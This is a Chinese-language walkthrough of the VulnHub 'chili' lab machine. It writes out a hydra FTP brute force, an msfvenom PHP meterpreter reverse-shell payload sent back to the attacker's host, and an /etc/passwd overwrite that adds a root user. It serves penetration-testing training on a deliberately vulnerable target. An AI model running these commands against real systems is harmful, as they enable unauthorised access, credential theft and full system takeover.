> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ejHH1KH2cQUL5gAZiEuNjQ)

点击蓝字，关注我们

0x00 靶机信息

靶机：chili  

难度：简单

下载: https://www.vulnhub.com/entry/chili-1,558/

0x01 信息收集

扫描当前网段，确定目标靶机 IP

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunfIw0DVm5CibDaIibl3QGvCYMicH81x0MCjtoKMoVnjJyqegiaR4ZVAic9Jw/640?wx_fmt=png)

只开放了 80、21 端口，直接访问，扫目录一梭子

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzuniaKld98oEvibddW8Doo1hcVfpnqTDDw5SibnibWibghN3QB7SsQjZMI2u0w/640?wx_fmt=png)

网页 目录空空如也，这种情况一般就要看页面源码

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunibF0NAqf8FXKN6vOkRTjIy1rgJtCba9WsMYdLOWE2xtOZlETNgiaRF5g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunWOVIGHRrwtekOhksDibth6BBk9jK2jrvvK4jSVccK3NLSLmkqHYMrPQ/640?wx_fmt=png)

查看源码发现一些关键词

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunqiagsokWGMHpEYqsdicDVqVMHJnDonb4HZxpNBRMStLXNCMKx4mlggzA/640?wx_fmt=png)

直接爬取关键词生成字典，准备爆破 FTP 服务

```
Cewl http://192.168.12.128 > user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunyMIw0Z0x5oaa32bO7g4BAQDxic8BfiaZvzfgVY0WlHFxHau2jcN8pIkQ/640?wx_fmt=png)

字典生成好了，直接开始爆破 FTP

```
hydra -L /root/user.txt -P /usr/share/wordlists/rockyou.txt -f -V ftp://192.168.12.128
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunElB3iaecKvOqjoSyE3T3eONMSuy19KibHSVyj1yjxl8Td1SChEc4ic8KQ/640?wx_fmt=png)

账号：chili

密码：a1b2c3d4

0x02 漏洞利用

先登入 FTP，成功登入 FTP

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunCeicv3nwj6MsibAAiayePmNEicicpATslxeib8skichONHGqgYgmA89uI1K2A/640?wx_fmt=png)

查看网站目录，看看文件和权限

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzun4LibjtYEWy50AgRSmGvoct55qUcDhFicyWvgvibMYTjtYwYRia2icuQ1suw/640?wx_fmt=png)

.nano 文件存在高权限，直接上 MSF 的 PHP 马

Msf 生成 php 马

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.12.130 LPORT=3388 -f raw > shell.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzuno4icaG0b3T0mWTsiaewsrmofnjDOMEo2jZpyOGdSnic0FT1eHVB0SxKqw/640?wx_fmt=png)

ftp 上传到. nano 设置 777 权限

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunz1QmWXK2KbV05r93xpHYWQBuUE9tMRW1DE9ib4v6tDTzLZzdJgtmf1w/640?wx_fmt=png)

Msf 开启监控，连接 php 马

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunbtwJhr8culqX0rIhmacPnhskDDXmLg4UicviazVBGRx58egZYuIRyfGg/640?wx_fmt=png)

0x03 提权

上传提权脚本并给 777 权限  

脚本：https://github.com/luke-goddard/enumy

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzun517G16y1zdEaSLYqV4OUpZmITMEl5SxMooTsIsJPkictiaSU62tiabASA/640?wx_fmt=png)

执行脚本

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunyI2Zpb88qUqamXWf5h231dChcFicAJV9fRNRicPpibeRofcKEPAMn9QRg/640?wx_fmt=png)

可写 passwd，构造 test 成高权用户

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunClA4qJ81HfVZLqoiay0nyqzjX6zMEPKXP9crKcumT4ic3ZWsCmwdujPA/640?wx_fmt=png)

```
/usr/bin/perl -le 'print crypt("test","test")'
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunypoZBRdicQIV2tEMXwvkNibQIarPib4XPKKsVILvOXp3RrAuuMCBEsLmg/640?wx_fmt=png)

```
echo "test:teH0wLIpW0gyQ:0:0:root:/root:/bin/bash" > /etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CscVExGRTgYWwiaSVRM39wzunT1TcrkDehX4RCGg41Uwm3y8pXOCSYdLgxtbwfFKqoHcrH2ApH7iagvA/640?wx_fmt=png)

拿到 flag

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Cse7ScwpcZ0hYFNyAKSke4yDtZo2F6PWmVicuic2AWqOhAZTDChCHULs8kCwFBsCjp1zkicUUKibT9icgzw/640?wx_fmt=png)

往期推荐：

[Vulnhub 篇 Photographerr:1](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483673&idx=1&sn=c1f22eebcf5affb13ae324af7a030449&chksm=eb4ec8a4dc3941b21b2078a6e5d84462ac0ae5253b9176c12d9e3d53539ba27e2d8fbe36f85f&scene=21#wechat_redirect)  

[Vulnhub 篇 presidential:1](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483700&idx=1&sn=5a54f2be75bd9bdf0d3a84367ea8afb2&chksm=eb4ec889dc39419f55e446dafd3e5aa26379cbc24b048b3d7624a3fb510ad87847b828b6e1b4&scene=21#wechat_redirect)